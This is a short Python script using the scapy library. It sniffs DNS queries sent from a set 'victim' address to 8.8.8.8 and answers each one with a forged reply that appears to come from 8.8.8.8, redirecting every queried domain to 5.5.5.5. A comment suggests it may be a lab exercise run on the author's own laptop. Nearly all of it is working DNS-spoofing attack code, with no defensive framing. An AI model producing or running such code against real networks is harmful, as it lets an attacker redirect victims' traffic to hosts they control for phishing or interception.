#!/usr/bin/env python3
from scapy.all import *

victim_addr = '10.0.0.33' #IP address of your laptop
target_addr = '8.8.8.8' 
target_iface = 'enp0s3'
loopback_iface = 'lo'
loopback_header = "\x02\x00\x00\x00" #for MacOS

def reply(p):
	if DNS in p:
		domain_name = p[DNS].qd.qname
		print(domain_name)
		redirect_addr = '5.5.5.5'
		dns = DNS(id=p[DNS].id,qr=1,rd=p[DNS].rd,ra=p[DNS].ra,qd=p[DNS].qd,an=DNSRR(rrname=domain_name,ttl=42,rdata=redirect_addr))
		p2 = loopback_header/IP(src=target_addr,dst=victim_addr)/UDP(sport=53,dport=p[UDP].sport)/dns
		send(p2, iface=loopback_iface)		

sniff(iface=target_iface, filter='src '+victim_addr+' and dst '+target_addr+' and udp port 53', prn=reply)
